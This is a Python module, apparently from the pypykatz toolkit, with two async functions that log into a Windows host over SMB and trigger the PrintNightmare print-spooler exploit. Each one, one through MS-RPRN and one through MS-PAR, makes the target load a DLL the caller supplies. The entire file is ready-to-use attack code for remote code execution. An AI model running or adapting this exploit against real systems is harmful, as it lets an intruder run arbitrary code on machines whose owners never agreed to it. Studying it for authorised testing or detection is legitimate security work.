import asyncio
import os

from pypykatz import logging

async def printnightmare(url, dll_path, driverpath = None):
    try:
        from aiosmb.commons.connection.url import SMBConnectionURL
        from aiosmb.commons.interfaces.machine import SMBMachine
        
        smburl = SMBConnectionURL(url)
        connection = smburl.get_connection()

        async with connection:
            logging.debug('[PRINTNIGHTMARE] Connecting to server...')
            _, err = await connection.login()
            if err is not None:
                raise err
            
            machine = SMBMachine(connection)
            logging.debug('[PRINTNIGHTMARE] Connected!')
            logging.debug('[PRINTNIGHTMARE] Triggering printnightmare...')
            _, err = await machine.printnightmare(dll_path, driverpath)
            if err is not None:
                raise err
            logging.debug('[PRINTNIGHTMARE] Printnightmare finished OK!')
            return True, None
    except Exception as e:
        import traceback
        traceback.print_exc()
        return None, e

async def parprintnightmare(url, dll_path, driverpath = None):
    try:
        from aiosmb.commons.connection.url import SMBConnectionURL
        from aiosmb.commons.interfaces.machine import SMBMachine
        
        smburl = SMBConnectionURL(url)
        connection = smburl.get_connection()

        async with connection:
            logging.debug('[PARPRINTNIGHTMARE] Connecting to server...')
            _, err = await connection.login()
            if err is not None:
                raise err
            
            machine = SMBMachine(connection)
            logging.debug('[PARPRINTNIGHTMARE] Connected!')
            logging.debug('[PARPRINTNIGHTMARE] Triggering parprintnightmare...')
            _, err = await machine.par_printnightmare(dll_path, driverpath)
            if err is not None:
                raise err
            logging.debug('[PARPRINTNIGHTMARE] Parprintnightmare finished OK!')
            return True, None
    except Exception as e:
        import traceback
        traceback.print_exc()
        return None, e